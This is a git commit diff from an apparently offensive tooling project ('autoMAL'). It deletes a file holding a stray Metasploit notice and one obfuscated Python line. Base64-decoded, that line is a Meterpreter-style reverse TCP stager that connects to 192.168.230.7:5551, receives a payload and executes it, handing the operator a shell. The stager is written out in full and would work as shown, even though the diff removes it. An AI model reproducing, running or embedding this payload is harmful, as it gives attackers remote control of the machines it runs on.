066db6f45fa6515188f00321686f6150b505abef
Marantral <infiltration.jedi@gmail.com>
2020-06-05 13:17:25 -0400

    Update added local IP search

--- aMALgamation/current/autoMAL/100-python-met.py
+++
@@ -1,8 +0,0 @@
------------------------------------------------------------------------------------
-The pg and/or activerecord gem version has changed, meaning deprecated pg constants
-may no longer be in use, so try deleting this file to see if the
-'The PGconn, PGresult, and PGError constants are deprecated...' message has gone:
-/opt/metasploit-framework/embedded/framework/lib/pg/deprecated_constants.rb
------------------------------------------------------------------------------------
-
-exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMjMwLjcnLDU1NTEpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKGQseydzJzpzfSkK')[0]))
